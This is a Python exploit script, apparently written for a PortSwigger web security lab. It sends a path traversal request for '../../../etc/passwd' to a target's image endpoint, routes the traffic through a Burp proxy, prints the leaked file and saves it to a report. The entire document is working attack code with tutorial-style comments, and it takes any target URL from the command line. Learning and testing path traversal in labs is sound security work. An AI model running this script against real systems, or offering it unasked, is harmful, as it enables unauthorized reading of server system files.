# Import the sys module to read command-line arguments (sys.argv)
import sys 

# Import the requests library to send HTTP requests without a browser
import requests

# Import urllib3 to control SSL certificate warnings
import urllib3

# Disable SSL certificate verification warnings because
# PortSwigger labs use self-signed certificates during testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Configure Burp Suite as the proxy so every request from
# this script is routed through Burp for interception and analysis
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

# EXPLOIT FUNCTION : Function responsible for exploiting the Path Traversal vulnerability
def directory_traversal_exploit(url):

    # Construct the vulnerable URL by appending the traversal payload
    image_url = url + '/image?filename=../../../etc/passwd'

    # Send a GET request to the vulnerable endpoint
    #
    # verify=False
    #   Ignore SSL certificate validation
    #
    # proxies=proxies
    #   Route traffic through Burp Suite
    r = requests.get(image_url, verify=False, proxies=proxies)

    # Verify whether the exploit succeeded by checking for
    # a unique string that exists inside /etc/passwd
    if 'root:x' in r.text:

        # Notify the user that exploitation succeeded
        print('(+) Exploit was sucessfull!')

        # Inform the user that the response contains /etc/passwd
        print('(+) THe following is the content of the /etc/passwd file:')

        # Print the entire HTTP response body
        print(r.text)

        # storing the exploited result in a report sheet
        with open("Directory_Traversal_Report.txt", "w") as report:
            report.write("(+) Exploit was successful!\n")
            report.write("(+) The following is the content of the /etc/passwd file:\n\n")
            report.write(r.text)
            
    else:

        # Inform the user that the expected response was not received
        print('(+) Exploit was failed.')

        # Exit the script with a non-zero exit code
        sys.exit(-1)

#main method
def main():

    # Ensure exactly one command-line argument (target URL) is supplied
    if len(sys.argv) != 2:

        
        # Display the correct syntax
        print("(+) Usage: %s <url>" % sys.argv[0])

        # Display an example command
        print("(+) Example: %s www.example.com" % sys.argv[0])

        # Exit because the required argument is missing
        sys.exit(-1)

    # Read the target URL from the command line
    url = sys.argv[1]

    # Inform the user that exploitation is starting
    print("(+) Exploiting the directory traversal vulnerability...")

    # Call the exploit function
    directory_traversal_exploit(url)

# Standard Python convention:
# Execute main() only when this file is run directly,
# not when it is imported as a module.
if __name__ == "__main__":    # "Only run this code if I started this file directly. If another Python file imports me, don't run it."
    main()
